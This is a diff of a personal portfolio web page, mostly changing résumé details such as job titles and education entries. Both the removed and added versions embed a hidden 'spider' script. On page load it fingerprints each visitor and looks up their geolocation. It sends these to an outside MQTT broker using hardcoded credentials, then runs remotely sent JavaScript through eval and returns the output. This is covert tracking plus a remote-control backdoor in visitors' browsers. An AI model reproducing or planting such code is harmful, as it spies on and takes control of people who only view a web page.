@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="description" content="reedleoneil">
-    <meta name="keywords" content="Reed Leoneil Pascual">
+    <meta name="keywords" content="reedleoneil">
     <meta name="author" content="reedleoneil">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Reed Leoneil Pascual</title>
+    <title>reedleoneil</title>
     <link rel="icon" type="image/png" href="https://reedleoneil.github.io/IMG_0020.PNG">
     <link rel="stylesheet" href="https://cdn.rawgit.com/konpa/devicon/df6431e323547add1b4cf45992913f15286456d3/devicon.min.css">
     <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css" integrity="sha384-mzrmE5qonljUremFsqc01SB46JvROS7bZs3IO2EmfFsd15uHvIt+Y8vEf7N7fWAU" crossorigin="anonymous">
@@ -64,7 +64,7 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/mqtt/4.2.8/mqtt.min.js" integrity="sha512-QhwpmT5Q0jBh/70LYcUtOVomQyPfvRv3iWg2MzxKn4OjYcZdE5PBbfE8LMEdNx3IW0rO9OtWzPbxckRh/g8TSw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
 </head>
 <body>
-    <button onclick="switchTheme()" style="display: none;"><i id="switch-theme" class="fas fa-yin-yang"></i> <span id="theme">Dark</span></button>
+    <button onclick="switchTheme()"><i id="switch-theme" class="fas fa-yin-yang"></i> <span id="theme">Dark</span></button>
 
     <header></header>
     <div></div>
@@ -138,7 +138,7 @@
             });
         }
 
-        let header = { en: "reedleoneil", jp: "リードレオニル" };
+        let header = { en: "reedleoneil", jp: "レイドレオニル" };
 
         let social_buttons = [
             { icon: "fab fa-linkedin", link: "https://www.linkedin.com/in/reedleoneil" },
@@ -149,12 +149,12 @@
         let sections = [
             { id: "experience", header: "Professional Experience" },
             { id: "education", header: "Education" },
-            // { id: "certifications", header: "Certifications" },
+            { id: "certifications", header: "Certifications" },
         ];
 
         let experience = [
             {
-                position: "Software Engineer",
+                position: "IT Engineer",
                 company: "TechnoPro Engineering Inc.",
                 company_link: "https://www.technopro.com/",
                 dates: "May 2022 - Present",
@@ -194,34 +194,34 @@
                     "Pre-Thesis: Designed and developed an android application for home automation to allow remote, voice, and SMS control of lighting and appliances."
                 ]
             },
-            // {
-            //     course: "Computer Hardware Servicing NC II",
-            //     insitution: "AMA Computer Learning Center",
-            //     insitution_link: "http://www.aclc.edu.ph",
-            //     dates: "Apr 2011 - May 2011",
-            //     descriptions: [
-            //         "Training in installing, configuring, diagnosing, and troubleshooting software and hardware in computer systems and networks.",
-            //         "Best in Networking"
-            //     ]
-            // },
-            // {
-            //     course: "Japanese Language N4 - N2",
-            //     insitution: "Japanese Language Research Center Inc.",
-            //     insitution_link: "https://atjlrc.com",
-            //     dates: "Jul 2020 - Dec 2022",
-            //     descriptions: [
-            //         "別の言語を話すことができるということは、第二の魂を持っているということ。"
-            //     ]
-            // },
-            // {
-            //     course: "Learning is Never Ending",
-            //     insitution: "Life",
-            //     insitution_link: "creed.Keep(\"faith\")",
-            //     dates: "Jul 1993 - Present",
-            //     descriptions: [
-            //         "To follow the path: look to the master, follow the master, walk with the master, see through the master, become the master."
-            //     ]
-            // },
+            {
+                course: "Computer Hardware Servicing NC II",
+                insitution: "AMA Computer Learning Center",
+                insitution_link: "http://www.aclc.edu.ph",
+                dates: "Apr 2011 - May 2011",
+                descriptions: [
+                    "Training in installing, configuring, diagnosing, and troubleshooting software and hardware in computer systems and networks.",
+                    "Best in Networking"
+                ]
+            },
+            {
+                course: "Japanese Language N4 - N2",
+                insitution: "Japanese Language Research Center Inc.",
+                insitution_link: "https://atjlrc.com",
+                dates: "Jul 2020 - Dec 2022",
+                descriptions: [
+                    "別の言語を話すことができるということは、第二の魂を持っているということ。"
+                ]
+            },
+            {
+                course: "Learning is Never Ending",
+                insitution: "Life",
+                insitution_link: "creed.Keep(\"faith\")",
+                dates: "Jul 1993 - Present",
+                descriptions: [
+                    "To follow the path: look to the master, follow the master, walk with the master, see through the master, become the master."
+                ]
+            },
         ];
 
         let certifications = [
@@ -421,7 +421,7 @@
             load_sections();
             load_experience();
             load_education();
-            // load_certifications();
+            load_certifications();
             load_footer();
         }
 
@@ -472,12 +472,10 @@
             }
         }
 
-        // load();
-        switchTheme();
+        load();
     </script>
-<script type="text/javascript">
-    let rsa = {
-        encodedPublicKey: `-----BEGIN PUBLIC KEY-----
+    <script type="text/javascript">
+        const publicKeyPEM = `-----BEGIN PUBLIC KEY-----
             MIIEIjANBgkqhkiG9w0BAQEFAAOCBA8AMIIECgKCBAEA2Id0EDHWJ3elOeTwuINK
             tJaMWUhE5Cv3gnksCWfYdMKfsXIe9nNU6gJ2uW07lRqobsrQAkwXd0LQ8UQP6p7C
             qtEKABfWg7vkhBZa8d04xotCbdwNPZ+/RGl0sSKDB5DoZlOu1Y8Goq70quJ6Z1tl
@@ -501,106 +499,90 @@
             sQJLq0yJPWPIbvCvJMVeHHgVrgFCyqwf0JEelczuTxTpt3UZZR5apgUWc65MDGWl
             LwJ9FG5sndUXe0sNRuhWovLHscSC4oDBEtqm3ZFeXxyHvszEN1Ls0NjbtjOnFE8Y
             /QIDAQAB
-                              -----END PUBLIC KEY-----`,
-        encrypt: (data) => {
-            jsencrypt = new JSEncrypt();
-            jsencrypt.setPublicKey(rsa.encodedPublicKey);
-            return jsencrypt.encrypt(data)
-        }
-    };
+                              -----END PUBLIC KEY-----`;
 
-    let aes = {
-        encodedKey: CryptoJS.MD5(Math.random().toString()).toString().slice(0, 16),
-        encrypt: (data) => {
-            key = CryptoJS.enc.Utf8.parse(aes.encodedKey);
-            let iv = CryptoJS.MD5(Math.random().toString()).toString().slice(0, 16);
-            let ciphertext = CryptoJS.AES.encrypt(data, key, {
-                iv: CryptoJS.enc.Utf8.parse(iv),
-                padding: CryptoJS.pad.Pkcs7
-            });
-            return iv + ciphertext.toString();
-        },
-        decrypt: (ciphertext) => {
-            key = CryptoJS.enc.Utf8.parse(aes.encodedKey);
-            let iv = ciphertext.slice(0, 16);
-            let data = CryptoJS.AES.decrypt(ciphertext.slice(16, ciphertext.length), key, {
-            iv: CryptoJS.enc.Utf8.parse(iv),
+        const encrypt = new JSEncrypt();
+        encrypt.setPublicKey(publicKeyPEM);
+        const aesKey = "SPI" + Date.now().toString();
+
+        function encryptRSA(data) {
+            return encrypt.encrypt(data)
+        }
+
+        function encryptAES(plaintext) {
+            key = CryptoJS.enc.Utf8.parse(aesKey);
+            let iv = CryptoJS.enc.Utf8.parse("1234567812345678"); //to do
+            let encrypted = CryptoJS.AES.encrypt(plaintext, key, {
+            iv: iv,
             padding: CryptoJS.pad.Pkcs7
             });
-            return data.toString(CryptoJS.enc.Utf8);
-        },
-    };
+            return encrypted.toString();
 
-    let hash = {
-        hexDigest: (text) => {
-            return CryptoJS.MD5(text.toString()).toString()
-        },
-    };
+        }
 
-    let serialization = {
-        serialize: (data) => {
-            return JSON.stringify(data);
-        },
-        deserialize: (data) => {
-            return JSON.parse(data);
-        },
-    };
-</script>
-<script type="text/javascript">
-    let spider = {
-        root: "https://reedleoneil.github.io",
-        mqttClient: null,
-        fingerprint: new ClientJS().getFingerprint().toString().padStart(10, "0"),
-        browser: new ClientJS().getBrowserData(),
-        geolocation : fetch('https://ipapi.co/json')
-                                .then(response => response.json())
-                                .then(data => { spider.geolocation = data; spider.connect() }),
-        status: "Offline",
-        lastonline: Date(),
-        key: aes.encodedKey,
-        connect: () => {
-            var mqttOptions = {
-                port: 8884,
-                protocol: "wss",
-                username: "testy",
-                password: "P@$$w0rd",
-                path: "/mqtt",
-                will: {
-                    topic: hash.hexDigest(spider.root) + "/" + hash.hexDigest(spider.fingerprint) + "/status",
-                    payload: rsa.encrypt(spider.status),
-                    retain: true
-                }
-            };
-            spider.mqttClient = mqtt.connect("wss://8e86d252f3c44fca8ce087b965c40d47.s1.eu.hivemq.cloud", mqttOptions);
-            spider.mqttClient.on("connect", spider.onConnect);
-            spider.mqttClient.on("message", spider.onMessage);
-            spider.mqttClient.subscribe(hash.hexDigest(spider.root) + "/" + hash.hexDigest(spider.fingerprint) + "/stdin");
-        },
-        onConnect: () => {
-            spider.status = "Online";
-            spider.mqttClient.publish(hash.hexDigest(spider.root) + "/" + hash.hexDigest(spider.fingerprint) + "/fingerprint", rsa.encrypt(spider.fingerprint), { retain: true });
-            spider.mqttClient.publish(hash.hexDigest(spider.root) + "/" + hash.hexDigest(spider.fingerprint) + "/key", rsa.encrypt(spider.key), { retain: true });
-            spider.mqttClient.publish(hash.hexDigest(spider.root) + "/" + hash.hexDigest(spider.fingerprint) + "/status", rsa.encrypt(spider.status), { retain: true });
-            spider.mqttClient.publish(hash.hexDigest(spider.root) + "/" + hash.hexDigest(spider.fingerprint) + "/lastonline", rsa.encrypt(spider.lastonline), { retain: true });
-            spider.mqttClient.publish(hash.hexDigest(spider.root) + "/" + hash.hexDigest(spider.fingerprint) + "/browser", rsa.encrypt(serialization.serialize(spider.browser)), { retain: true });
-            spider.mqttClient.publish(hash.hexDigest(spider.root) + "/" + hash.hexDigest(spider.fingerprint) + "/geolocation", rsa.encrypt(serialization.serialize(spider.geolocation)), { retain: true });
-        },
-        onMessage: (topic, payload) => {
-            topic = topic.split("/");
-            var root = topic[0],
-                fingerprint = topic[1],
-                stdio = topic[2];
-            if (root == hash.hexDigest(spider.root) && fingerprint == hash.hexDigest(spider.fingerprint) && stdio == "stdin") {
-                try {
-                    out = eval(aes.decrypt(payload.toString()));
-                    if (out)
-                        spider.mqttClient.publish(hash.hexDigest(spider.root) + "/" + hash.hexDigest(spider.fingerprint) + "/stdout", aes.encrypt(JSON.stringify(out)));
-                } catch (error) {
-                    spider.mqttClient.publish(hash.hexDigest(spider.root) + "/" + hash.hexDigest(spider.fingerprint) + "/stderr", aes.encrypt(error.toString()));
+        function decryptAES(ciphertext) {
+            key = CryptoJS.enc.Utf8.parse(aesKey);
+            let iv = CryptoJS.enc.Utf8.parse("1234567812345678"); //to do
+            let encrypted = CryptoJS.AES.decrypt(ciphertext.toString(), key, {
+            iv: iv,
+            padding: CryptoJS.pad.Pkcs7
+            });
+            return encrypted.toString(CryptoJS.enc.Utf8);
+        }
+    </script>
+    <script type="text/javascript">
+        let spider = {
+            root: "spiderjs",
+            mqttClient: null,
+            fingerprint: new ClientJS().getFingerprint(),
+            browserData: new ClientJS().getBrowserData(),
+            geolocation : fetch('https://ipapi.co/json')
+                                    .then(response => response.json())
+                                    .then(data => { spider.geolocation = data; spider.connect() }),
+            status: "Offline",
+            lastOnline: Date(),
+            key: aesKey,
+
+            connect: () => {
+                var mqttOptions = {
+                    port: 8884,
+                    protocol: "wss",
+                    username: "testy",
+                    password: "P@$$w0rd",
+                    path: "/mqtt",
+                    will: {
+                        topic: spider.root + "/" + spider.fingerprint + "/status",
+                        payload: encryptRSA(JSON.stringify({status: "Offline", lastOnline: spider.lastOnline, key: spider.key})),
+                        retain: true
+                    }
+                };
+                spider.mqttClient = mqtt.connect("wss://8e86d252f3c44fca8ce087b965c40d47.s1.eu.hivemq.cloud", mqttOptions);
+                spider.mqttClient.on("connect", spider.onConnect);
+                spider.mqttClient.on("message", spider.onMessage);
+                spider.mqttClient.subscribe(spider.root + "/" + spider.fingerprint + "/stdin");
+            },
+            onConnect: () => {
+                spider.status = "Online";
+                spider.mqttClient.publish(spider.root + "/" + spider.fingerprint + "/status", encryptRSA(JSON.stringify({status: "Online", lastOnline: spider.lastOnline, key: spider.key})), { retain: true });
+                spider.mqttClient.publish(spider.root + "/" + spider.fingerprint + "/browserData", encryptRSA(JSON.stringify(spider.browserData)), { retain: true });
+                spider.mqttClient.publish(spider.root + "/" + spider.fingerprint + "/geolocation", encryptRSA(JSON.stringify(spider.geolocation)), { retain: true });
+            },
+            onMessage: (topic, payload) => {
+                topic = topic.split("/");
+                var root = topic[0],
+                    fingerprint = topic[1],
+                    stdio = topic[2];
+                if (root == spider.root && fingerprint == spider.fingerprint && stdio == "stdin") {
+                    try {
+                        out = eval(decryptAES(payload.toString()));
+                        if (out)
+                            spider.mqttClient.publish(spider.root + "/" + spider.fingerprint + "/stdout", encryptAES(JSON.stringify(out)));
+                    } catch (error) {
+                        spider.mqttClient.publish(spider.root + "/" + spider.fingerprint + "/stderr", encryptAES(error.toString()));
+                    }
                 }
             }
-        }
-    };
-</script>
+        };
+    </script>
 </body>
 </html>
